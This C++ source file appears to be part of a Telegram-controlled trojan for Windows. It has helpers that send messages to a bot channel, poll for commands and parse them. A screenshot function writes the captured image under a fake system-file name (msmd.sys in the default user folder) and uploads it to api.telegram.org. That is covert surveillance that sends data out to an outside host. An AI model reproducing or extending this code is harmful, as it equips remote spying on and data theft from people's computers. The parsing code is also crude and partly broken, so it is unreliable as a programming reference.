#include <Windows.h>
#include <string>
#include <vector>
#include "common.h"

#define _DEBUG_

int TeleSendMessage(const char*data,const char* botToken,const char*channelID)
{
	std::string error = "ERROR";
	std::string Parameters;
	Parameters += botToken; 
	Parameters += "/";
	Parameters += "sendMessage?chat_id=";
	Parameters += "@";
	Parameters += channelID;
	Parameters += "&text=";
	Parameters += data;
	Parameters += "&parse_mode=html";
	std::wstring ws = s2ws(Parameters);
	if (WINHTTP_GET(L"api.telegram.org",ws.c_str()) == error)
		return 1;
	return 0;
}

std::string TeleUpdateMostRecent(const char*botToken,int offset)
{
	std::string Parameters;
	Parameters += botToken;
	Parameters += "/";
	Parameters += "getUpdates?offset=";
	Parameters += std::to_string(offset);
	Parameters += "&limit=1";
	std::wstring ws = s2ws(Parameters);
	std::string response = WINHTTP_GET(L"api.telegram.org", ws.c_str());
	return response;
}

int TeleGetCurrentOffset(const char*botToken) 
{
	std::string Parameters;
	std::string ret;
	Parameters += botToken;
	Parameters += "/";
	Parameters += "getUpdates?limit=1";
	std::wstring ws = s2ws(Parameters);
	std::string response = WINHTTP_GET(L"api.telegram.org", ws.c_str());
	int pos = response.find("update_id");
	if (pos != std::string::npos)
	{
		for (int i = pos; i < response.size(); i++) 
		{
			if (response.c_str()[i] == ':')
			{
				i++;
				while (response.c_str()[i] != ',')
				{
					ret += response.c_str()[i];
					i++;
				}
				return atoi(ret.c_str());
			}
		}
	}
	return 0;
}

std::string TeleParseData(std::string response)
{
	std::string ret;
	int pos = response.find("text\":");
	if (pos != std::string::npos)
	{
		pos += 7;
		for (int i = pos; i < response.size(); i++)
		{	
			if (response.c_str()[i] != '"')
			{
				ret += response.c_str()[i];
			}
			else
			{
				break; //make sure there are no double quotes in the actual string or it will fuck everything up
			} 
		}
	}
	return ret;
}

bool TeleCheckIfEmpty(std::string data) 
{
	const char*meh = strstr(data.c_str(), "{\"ok\":true,\tresult\t:[]}");
	if (meh != 0)
		return true;
	return false;
}

std::string TeleParseArg1(std::string data) //vectors... meh
{
	std::string results;
	for (int i = 0;i<data.size();i++)
	{
		if (data.c_str()[i] == '[')
		{
			i++; //location where data starts...
			while (i<data.size())
			{
				if (data.c_str()[i] == ':')
					if (data.c_str()[i+1] == '=')
						break;
				results += data.c_str()[i];
				i++;
			}
		}
	}
	return results; //check to make sure size is greater than 0...
}

std::string TeleParseArg2(std::string data) //vectors... meh
{
	std::string results;
	for (int i = 0;i<data.size();i++)
	{
		if (data.c_str()[i] == ':' && data.c_str()[i+1] == '=')
		{
			i+=2;
			while (data.c_str()[i] != ']' && i < data.size())
			{
				results += data.c_str()[i];
				i++;
			}
		}
	}
	return results; //check to make sure size is greater than 0...
}

std::string TeleParseArgs(std::string data)
{
	std::string results;
	for (int i = 0;i<data.size();i++)
	{
		if (data.c_str()[i] == '[')
		{
			i++;
			while (data.c_str()[i] != ']' && i < data.size())
			{
				results += data.c_str()[i];
				i++;
			}
		}
	}
	return results; //check to make sure size is greater than 0...
}


std::string TeleUploadScreenShot(const char* botToken,const char*channelID)
{
	SaveScreenshot(std::string("C:\\Users\\default\\msmd.sys"),100);
	std::string contents = ReadEntireFile(L"C:\\Users\\default\\msmd.sys");
	mprintf(contents.c_str());
	std::string Parameters;
	Parameters += botToken;
	Parameters += "/";
	Parameters += "sendPhoto?chat_id=@";
	Parameters += channelID;
	mprintf(WINHTTP_POST(L"api.telegram.org",s2ws(Parameters).c_str(),contents.c_str()).c_str());
	return std::string("no done");
}